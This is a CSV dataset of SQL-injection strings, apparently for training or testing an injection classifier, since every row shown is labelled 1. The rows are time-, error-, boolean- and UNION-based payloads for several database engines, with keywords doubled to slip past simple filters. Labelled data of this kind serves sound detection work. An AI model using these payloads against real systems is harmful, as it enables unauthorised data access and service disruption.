Query,Label
"1""  )   wwherehere 9020  =  9020 oorr row  (  1045,7562  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom   (  seleselectct 8488 uniunionon seleselectct 5584 uniunionon seleselectct 3051 uniunionon seleselectct 1210  )  a group bbyy x  )  --",1
"1   )    )     )   oorr 5356  =    (  selecselectt count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9606%""   )    )     )   uunionnion all seselectlect 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1
"-3498""   )    )    as xbvb whewherere 2056  =  2056 uunionnion all seleselectct 2056,2056,2056,2056,2056,2056,2056--",1
"1' anandd 8514  =    (  seleselectct count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )   anandd 'tfso'  =  'tfso",1
"1' iinn boolean mode  )   oorr elt  (  6272  =  6272,sleep  (  5   )    )   #",1
"1 anandd elt  (  4249  =  4249,7259  )  # lwyo",1
"1""  )   as semi wherwheree 4260  =  4260",1
1'   )    )    as qswu whwhereere 6377  =  6377,1
"1%""  )   anandd 8514  =    (  selselectect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )   anandd   (  ""%""  =  """,1
"-9496   )    )     )   oorr elt  (  7511  =  3951,3951  )   anandd    (    (     (  3514  =  3514",1
"-8686"" wherwheree 4532  =  4532 oorr elt  (  3301  =  9065,9065  )  --",1
"1""  )   wherwheree 8254  =  8254 aandnd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1  )   oorr 4915  =    (  seleselectct count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )  --",1
sselectelect case when 5894  =  4052 then 1 else nnullull end--,1
"sselectelect count  (  *  )   ffromrom sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3 aandnd    (    (     (  4537  =  4537",1
"1%""  )   aandnd make_ssetet  (  9956  =  1060,1060  )   aandnd   (  ""%""  =  """,1
1%' aandnd sleep  (  5  )   aandnd '%'  =  ',1
"1"" oorr sleep  (  5  )   anandd ""telb""  =  ""telb",1
1%'  )   anandd   (  3020  =  3020  )  *6703 anandd   (  '%'  =  ',1
"-1187'  )   uunionnion all seleselectct 8202,8202,8202,8202,8202,8202,8202#",1
"-6249'   )    )     )   uunionnion all seselectlect 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1
"1 oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
"1'  )   wwherehere 1625  =  1625 aandnd 3707  =    (  selselectect count  (  *  )   frofromm sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )  --",1
1%' rllikeike   (  seselectlect   (  case when   (  3596  =  4245  )   then 1 else 0x28 end   )    )    anandd '%'  =  ',1
"1   )    )    uniounionn all selselectect nulnulll,nulnulll#",1
"1'  )   anandd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
1  )   whewherere 8041  =  8041,1
"1"" oorr sleep  (  5  )  ",1
1  )   as sglv wherwheree 7676  =  7676,1
"1'   )    )     )   aandnd make_ssetet  (  7539  =  3946,3946  )   aandnd    (    (     (  'qbpo'  =  'qbpo",1
"1' whewherere 9241  =  9241 oorr 4915  =    (  sselectelect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )  --",1
1   )    )     )   oorr 6793  =    (  seleselectct 6793 frofromm pg_sleep  (  5   )    )    anandd    (    (     (  3919  =  3919,1
"1   )    )    aandnd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   2939  =  2939",1
"1""   )    )     )   oorr 9643  =    (  selecselectt count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )   anandd    (    (     (  ""nthu"" llikeike ""nthu",1
"1  )   wwherehere 3740  =  3740 ununionion all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1"" oorr row  (  1045,7562  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom   (  seselectlect 8488 uunionnion seselectlect 5584 uunionnion seselectlect 3051 uunionnion seselectlect 1210  )  a group bbyy x  )  ",1
"1""  )   aandnd 3754  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual  )   aandnd   (  ""tlpw""  =  ""tlpw",1
"1%'   )    )     )   aandnd 2716  =    (  selselectect count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"iif  (  8770  =  9611,1,1/0  )  ",1
-2233' oorr   (  1807  =  7274  )  *7274,1
"1%'   )    )    aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'  )   oorr   (  selselectect 9173 frfromom  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd   (  '%'  =  '",1
1'  )   whewherere 5279  =  5279 oorr sleep  (  5  )  #,1
selecselectt sleep  (  5  )   anandd    (    (     (  'qjsc'  =  'qjsc,1
1%' oorr 6793  =    (  sselectelect 6793 frofromm pg_sleep  (  5   )    )    anandd '%'  =  ',1
"-2857%'   )    )     )   uniunionon all selecselectt 7167,7167,7167,7167,7167,7167,7167,7167#",1
"1"" wherwheree 5845  =  5845 anandd 5556  =    (  selselectect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1  )   as jtfx wherwheree 8038  =  8038,1
"-4699  )   as mymz whwhereere 3405  =  3405 oorr elt  (  1032  =  1032,3623  )  --",1
"1'   )    )     )   aandnd 8635  =    (  seselectlect count  (  *  )   frfromom generate_series  (  1,5000000   )    )   --",1
"1%""   )    )    anandd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
"1'||  (  selselectect 'xbvz' ffromrom dual whwhereere 1632  =  1632 uniunionon all selselectect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1   )    )    as spdf wherwheree 8554  =  8554 oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
1'||  (  seleselectct 'ylio' frfromom dual whwhereere 3767  =  3767 aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1
"-9160'  )   uniounionn all sselectelect 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
"1"" anandd 2716  =    (  seselectlect count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-5972"" oorr 8509  =  3448#",1
"1 oorr 4915  =    (  sselectelect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  --",1
"1'   )    )     )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    anandd    (    (     (  'ccqs'  =  'ccqs",1
 (  sselectelect   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as iinnt  )  /  (  sselectelect 0 frfromom dual  )   end  )   frfromom dual  ) ,1
-7775 oorr 8571  =  8571--,1
"1   )    )    uniunionon all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"-1710""   )    )    as cvky wwherehere 1858  =  1858 uniunionon all selecselectt 1858,1858--",1
"-7691"" oorr 1 group bbyy concat  (  0x7171706a71,  (  selselectect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
1 wwherehere 7425  =  7425 rlilikeke   (  sselectelect   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --,1
"1'||  (  seleselectct 'aoad' wherwheree 8795  =  8795 aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull   )    )   ||'",1
1%'   )    )     )   oorrdoorrderer bbyy 1--,1
1  )   as xwgf whwhereere 4204  =  4204 aandnd sleep  (  5  )  --,1
1  )   anandd 9198  =  9198--,1
"1 wwherehere 8905  =  8905 aandnd make_ssetet  (  7654  =  1923,1923  )  --",1
"1'  )   anandd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd   (  'xhez' liklikee 'xhez",1
"1'  )   as hvyx whwhereere 3194  =  3194 anandd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )  --",1
"-3343'||  (  selecselectt 'ssvt' whwhereere 5179  =  5179 uniunionon all selecselectt 5179,5179,5179,5179,5179,5179,5179,5179--",1
"-9432   )    )    as nqya whewherere 8387  =  8387 oorr elt  (  9242  =  6180,6180  )  --",1
 ) ,1
"1,  (  sselectelect   (  case when   (  2970  =  5830  )   then 1 else 2970*  (  sselectelect 2970 frofromm mysql.db  )   end   )    )   ",1
-3424'   )    )    oorr 4144  =    (  selselectect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual  )   aandnd    (    (   'dyuo'  =  'dyuo,1
"-4176'+  (  selecselectt 'muio' whwhereere 4256  =  4256 uniunionon all selecselectt 4256,4256,4256,4256,4256,4256#",1
"1' anandd 8514  =    (  seleselectct count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )   anandd 'qyyg'  =  'qyyg",1
"1   )    )    as bebl wwherehere 2597  =  2597   (  selselectect   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   ffromrom iinnfoorrmation_schema.system_users  )  --",1
"1  )   oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
"1%' oorr 9643  =    (  sselectelect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )   aandnd '%'  =  '",1
1  )   whewherere 3936  =  3936,1
"seleselectct count  (  *  )   frfromom generate_series  (  1,5000000  )   aandnd    (    (   ""dros""  =  ""dros",1
1'  )   aandnd   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1%'   )    )     )   anandd 8635  =    (  seleselectct count  (  *  )   frfromom generate_series  (  1,5000000   )    )   --",1
1%'   )    )     )   oorr 6793  =    (  sselectelect 6793 frofromm pg_sleep  (  5   )    )    anandd    (    (     (  '%'  =  ',1
"sselectelect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3 aandnd    (    (   '%'  =  '",1
"1""  )   oorr   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  ydpu  )   aandnd   (  ""cadh"" llikeike ""cadh",1
"1' wherwheree 2123  =  2123 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1 anandd exp  (  ~  (  seselectlect * ffromrom   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1'  )   aandnd make_sesett  (  8403  =  8403,8899  )   aandnd   (  'dhoo' lilikeke 'dhoo",1
"1,row  (  7937,5067  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom   (  seleselectct 9974 uniounionn seleselectct 5497 uniounionn seleselectct 8209 uniounionn seleselectct 8147  )  a group bbyy x  )  ",1
"1'  )   oorr 5356  =    (  sselectelect count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1',  (  selecselectt   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  selecselectt 6750 ffromrom iinnfoorrmation_schema.character_sesetts  )   end   )    )   ",1
"1%'   )    )     )   aandnd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
-9841 whwhereere 4612  =  4612 uniounionn all seselectlect 4612--,1
"-5161%"" oorr   (  1437  =  4869  )  *4869 anandd ""%""  =  """,1
"1'  )   oorr 8315  =    (  seselectlect count  (  *  )   ffromrom sysibm.systabltablees as t1,sysibm.systabltablees as t2,sysibm.systabltablees as t3  )   aandnd   (  'lmoh' liklikee 'lmoh",1
1  )   wwherehere 6950  =  6950 rlilikeke   (  selselectect * ffromrom   (  selselectect  (  sleep  (  5   )    )     )  sgvo  )  --,1
"1""  )   oorr 4915  =    (  selselectect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  --",1
"-6595"" ooorrderrder bbyy 1--",1
selecselectt sleep  (  5  )   anandd 'beuk'  =  'beuk,1
"1%""  )   uniunionon all selselectect nunullll,nunullll,nunullll,nunullll,nunullll--",1
"-2178'   )    )     )   oorr elt  (  3421  =  2899,2899  )   aandnd    (    (     (  'jdst'  =  'jdst",1
"1   )    )     )   anandd elt  (  3132  =  1541,1541  )   anandd    (    (     (  4258  =  4258",1
"1%""   )    )    waitfoorr delay '0:0:5'--",1
"-2821""   )    )     )   uunionnion all seselectlect 3920,3920,3920,3920,3920,3920,3920#",1
"1%'  )    (  seleselectct   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nnullull  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frofromm iinnfoorrmation_schema.system_users  )   anandd   (  '%'  =  '",1
"1' oorr   (  selecselectt 9173 frofromm  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd 'akki'  =  'akki",1
"-9966'   )    )    uniounionn all selselectect 7230,7230,7230,7230,7230,7230,7230#",1
1'  )   whewherere 1183  =  1183,1
"1' iinn boolean mode  )   uniounionn all seselectlect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
1' whewherere 5230  =  5230,1
"1""   )    )     )   oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   anandd    (    (     (  ""lmjg"" llikeike ""lmjg",1
1'  )   as bzem whwhereere 4240  =  4240,1
seleselectct   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as iinnt  )  /  (  seleselectct 0 ffromrom dual  )   end  )   ffromrom dual--,1
1'||  (  seselectlect 'wszt' frofromm dual whwhereere 6854  =  6854 anandd 6969  =    (  seselectlect 6969 frofromm pg_sleep  (  5   )    )     )  ||',1
1 anandd sleep  (  5  )  # qcyj,1
"1""   )    )     )   oorr 8421  =    (  seleselectct count  (  *  )   ffromrom generate_series  (  1,5000000   )    )    anandd    (    (     (  ""lynw"" llikeike ""lynw",1
1 whewherere 4519  =  4519,1
"1"" whewherere 9901  =  9901 anandd   (  2455  =  8499  )  *8499--",1
"1""  )   whwhereere 2496  =  2496",1
1' wherwheree 4945  =  4945,1
selecselectt   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  selecselectt 3435 frfromom master..sysdatabdatabaseases  )   end  )  --,1
"1  )   as asmt whewherere 4986  =  4986 uniunionon all seselectlect nulnulll,nulnulll#",1
"seselectlect llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd    (    (   'kyos' llikeike 'kyos",1
selselectect sleep  (  5  )   aandnd   (  '%'  =  ',1
"-9535"" oorroorrderder bbyy 1--",1
"1""  )   as awdg wherwheree 9512  =  9512",1
"1""  )   aandnd exp  (  ~  (  sselectelect * frofromm   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd   (  ""wfwg"" liklikee ""wfwg",1
1' rliklikee   (  selecselectt   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd 'nbxw'  =  'nbxw,1
"1'  )   aandnd 6414  =    (  seselectlect count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
"1""   )    )     )   uniounionn all sselectelect nunullll,nunullll,nunullll,nunullll--",1
"1   )    )    oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""  )   anandd 8407  =    (  sselectelect count  (  *  )   frfromom generate_series  (  1,5000000   )    )    anandd   (  ""kssm""  =  ""kssm",1
"1' wherwheree 4185  =  4185 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1"" whewherere 1982  =  1982",1
"1' iinn boolean mode  )   uniounionn all selselectect nnullull,nnullull#",1
"-4318""  )   as vpvt wherwheree 5543  =  5543 uniunionon all selecselectt 5543,5543,5543,5543,5543,5543--",1
"1""   )    )     )   oorr 4411  =    (  seleselectct count  (  *  )   ffromrom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (     (  ""abcw""  =  ""abcw",1
